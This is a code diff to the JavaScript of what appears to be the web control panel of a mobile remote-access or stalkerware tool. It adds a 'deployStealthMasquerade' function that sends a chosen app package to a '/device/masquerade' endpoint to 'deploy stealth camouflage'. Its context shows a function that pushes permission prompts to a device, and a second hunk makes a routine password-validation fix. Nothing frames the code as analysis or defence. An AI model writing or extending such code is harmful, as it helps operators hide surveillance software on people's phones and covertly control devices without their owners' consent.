@@ -209,6 +209,22 @@ function repairProtocol() {
   });
 }
 
+function deployStealthMasquerade() {
+  const sel = document.getElementById("stealth-app-select");
+  if (!sel || !sel.value) {
+    showToast("SELECT_AN_INSTALLED_APP", "error");
+    return;
+  }
+  const pkg = sel.value;
+  showToast("DEPLOYING_STEALTH_CAMOUFLAGE...");
+  fetch("/device/masquerade?pkg=" + encodeURIComponent(pkg))
+    .then(r => {
+      showToast("STEALTH_CAMOUFLAGE_DEPLOYED");
+      setTimeout(() => location.reload(), 1500);
+    })
+    .catch(err => showToast("CAMOUFLAGE_ERROR", "error"));
+}
+
 function dispatchPermissionSequence() {
   showToast("PERMISSION_PROMPTS_SENT");
   fetch("/device/request-permissions")
@@ -364,12 +380,18 @@ async function handleLogin(e) {
 
 async function updatePassword(e) {
   e.preventDefault();
-  const t = e.target.querySelector('input[name="new_password"]').value;
+  const inputEl = e.target.querySelector('input[name="new_password"]');
+  if (!inputEl) return;
+  const t = inputEl.value;
+  if (!t || !t.trim()) {
+    showToast("Password cannot be empty", "error");
+    return;
+  }
   try {
     const res = await fetch("/settings/password", {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
-      body: "new_password=" + encodeURIComponent(mask(t))
+      body: "new_password=" + encodeURIComponent(mask(t.trim()))
     });
     const text = await res.text();
     document.open();
